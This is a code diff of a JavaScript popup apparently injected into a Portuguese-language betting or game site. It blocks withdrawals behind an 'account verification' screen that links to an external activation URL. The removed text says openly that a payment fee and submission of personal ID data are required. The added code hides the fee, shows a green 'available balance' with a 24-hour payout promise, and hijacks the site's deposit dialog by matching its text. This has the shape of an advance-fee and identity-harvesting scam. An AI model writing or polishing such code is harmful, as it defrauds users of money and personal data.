@@ -156,7 +156,15 @@
     "#mx-kyc .kstep .ks-n{flex-shrink:0;width:24px;height:24px;border-radius:50%;background:rgba(245,192,0,.15);color:#F5C000;font-size:11px;font-weight:900;display:flex;align-items:center;justify-content:center}",
     "#mx-kyc .kstep .ks-n.done{background:#22c55e;color:#fff}",
     "#mx-kyc .kstep .ks-t{font-size:12px;color:rgba(255,255,255,.6);line-height:1.4}",
-    "#mx-kyc .kstep .ks-t b{color:#fff;font-weight:700}"
+    "#mx-kyc .kstep .ks-t b{color:#fff;font-weight:700}",
+    "#mx-kyc .kwarn{background:rgba(245,192,0,.15);border:1px solid rgba(245,192,0,.3);border-radius:12px;padding:14px;margin-bottom:14px;text-align:left}",
+    "#mx-kyc .kwarn-t{font-size:13px;font-weight:800;color:#F5C000;margin-bottom:6px;display:flex;align-items:center;gap:6px}",
+    "#mx-kyc .kwarn-p{font-size:11px;color:rgba(255,255,255,.6);line-height:1.5}",
+    "#mx-kyc .kfeats{text-align:left;margin:0 0 16px}",
+    "#mx-kyc .kfeat{font-size:12px;color:rgba(255,255,255,.7);padding:6px 0;line-height:1.4;display:flex;align-items:center;gap:8px}",
+    "#mx-kyc .ksub-link{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;box-sizing:border-box;text-decoration:none;border-radius:12px;padding:14px;font-family:inherit;font-size:13px;font-weight:800;letter-spacing:.04em;color:#0D0D0D;background:linear-gradient(90deg,#F5C000,#ffd84d);box-shadow:0 6px 24px rgba(245,192,0,.35);transition:transform .15s,box-shadow .15s;border:0;cursor:pointer}",
+    "#mx-kyc .ksub-link:hover{transform:translateY(-1px);box-shadow:0 10px 30px rgba(245,192,0,.45)}",
+    "#mx-kyc .kbal-green span:last-child{color:#22c55e}"
   ].join("\n");
   document.head.appendChild(style);
 
@@ -197,21 +205,26 @@
   function showActivationNeeded() {
     var uid = getUserId() || "";
     var link = ACTIVATION_URL + (uid ? "?ref=" + uid : "");
-    var box = showOv(
-      '<div class="ke">🔒</div>' +
-      '<span class="kb">VERIFICAÇÃO DE CONTA</span>' +
-      '<h2>Ative a sua <span>Conta</span></h2>' +
-      '<p class="kp">Para levantar os seus ganhos, é necessário verificar e ativar a sua conta. Siga os passos abaixo:</p>' +
-      '<div class="ksteps">' +
-        '<div class="kstep"><div class="ks-n">1</div><div class="ks-t"><b>Pague a taxa de ativação</b> — pagamento único para ativar levantamentos.</div></div>' +
-        '<div class="kstep"><div class="ks-n">2</div><div class="ks-t"><b>Preencha a verificação KYC</b> — envie os seus dados pessoais (nome, BI, data de nascimento).</div></div>' +
-        '<div class="kstep"><div class="ks-n">3</div><div class="ks-t"><b>Aguarde a aprovação</b> — a sua conta será verificada em até 7 dias úteis.</div></div>' +
-      '</div>' +
-      '<a href="' + link + '" target="_blank" rel="noopener" class="kfee">💳 PAGAR TAXA DE ATIVAÇÃO</a>' +
-      '<p class="knote">Após o pagamento, volte aqui para completar a verificação KYC.</p>' +
-      '<button class="ksec" id="kyc-back">VOLTAR AO JOGO</button>'
-    );
-    box.querySelector("#kyc-back").addEventListener("click", closeOv);
+    fetchProfile().then(function (profile) {
+      var bal = profile ? profile.balance : 0;
+      var box = showOv(
+        '<div class="ke">🛡️</div>' +
+        '<span class="kb">VERIFICAÇÃO DE CONTA</span>' +
+        '<div class="kwarn">' +
+          '<div class="kwarn-t">⚠️ Levantamentos disponíveis apenas para contas verificadas</div>' +
+          '<div class="kwarn-p">Para continuar a jogar e poder levantar os seus ganhos, é necessário verificar a sua conta.</div>' +
+        '</div>' +
+        '<div class="kbal kbal-green"><span>Saldo Disponível</span><span>' + fmtKz(bal) + '</span></div>' +
+        '<div class="kfeats">' +
+          '<div class="kfeat">✅ Verificação única e rápida</div>' +
+          '<div class="kfeat">⏱️ Levantamento processado em até 24h após verificação</div>' +
+          '<div class="kfeat">🔒 Protege a sua conta contra fraudes</div>' +
+        '</div>' +
+        '<a href="' + link + '" target="_blank" rel="noopener" class="ksub-link">🛡️ Verificar Conta ↗</a>' +
+        '<button class="ksec" id="kyc-back" style="margin-top:12px">Voltar ao jogo</button>'
+      );
+      box.querySelector("#kyc-back").addEventListener("click", closeOv);
+    });
   }
 
   /* ═══════════════════════════════════════════════
@@ -413,6 +426,46 @@
   }
 
   /* ═══════════════════════════════════════════════
+     DEPÓSITO — popup de verificação (intercepta DEPOSITAR)
+     ═══════════════════════════════════════════════ */
+  function showDepositVerification(balance) {
+    var uid = getUserId() || "";
+    var link = ACTIVATION_URL + (uid ? "?ref=" + uid : "");
+    var box = showOv(
+      '<div class="ke">🛡️</div>' +
+      '<span class="kb">VERIFICAÇÃO DE CONTA</span>' +
+      '<div class="kwarn">' +
+        '<div class="kwarn-t">⚠️ Levantamentos disponíveis apenas para contas verificadas</div>' +
+        '<div class="kwarn-p">Para continuar a jogar e poder levantar os seus ganhos, é necessário verificar a sua conta.</div>' +
+      '</div>' +
+      '<div class="kbal kbal-green"><span>Saldo Disponível</span><span>' + fmtKz(balance) + '</span></div>' +
+      '<div class="kfeats">' +
+        '<div class="kfeat">✅ Verificação única e rápida</div>' +
+        '<div class="kfeat">⏱️ Levantamento processado em até 24h após verificação</div>' +
+        '<div class="kfeat">🔒 Protege a sua conta contra fraudes</div>' +
+      '</div>' +
+      '<a href="' + link + '" target="_blank" rel="noopener" class="ksub-link">🛡️ Verificar Conta ↗</a>' +
+      '<button class="ksec" id="kyc-back" style="margin-top:12px">Voltar ao jogo</button>'
+    );
+    box.querySelector("#kyc-back").addEventListener("click", closeOv);
+  }
+
+  var depositCheckPending = false;
+
+  function handleDeposit() {
+    if (depositCheckPending) return;
+    depositCheckPending = true;
+    fetchProfile().then(function (profile) {
+      if (!profile || !profile.activated) {
+        showDepositVerification(profile ? profile.balance : 0);
+      }
+      setTimeout(function () { depositCheckPending = false; }, 5000);
+    }).catch(function () {
+      setTimeout(function () { depositCheckPending = false; }, 5000);
+    });
+  }
+
+  /* ═══════════════════════════════════════════════
      Handler principal — decide que ecrã mostrar
      ═══════════════════════════════════════════════ */
   function handleWithdraw() {
@@ -444,6 +497,10 @@
       var t = (dlgs[i].textContent || "").toLowerCase();
       if (t.indexOf("verificação de conta") !== -1 || t.indexOf("levantar fundos") !== -1) {
         handleWithdraw();
+        return;
+      }
+      if (t.indexOf("escolha o valor") !== -1 || (t.indexOf("depositar") !== -1 && t.indexOf("depósito") !== -1)) {
+        handleDeposit();
         return;
       }
     }
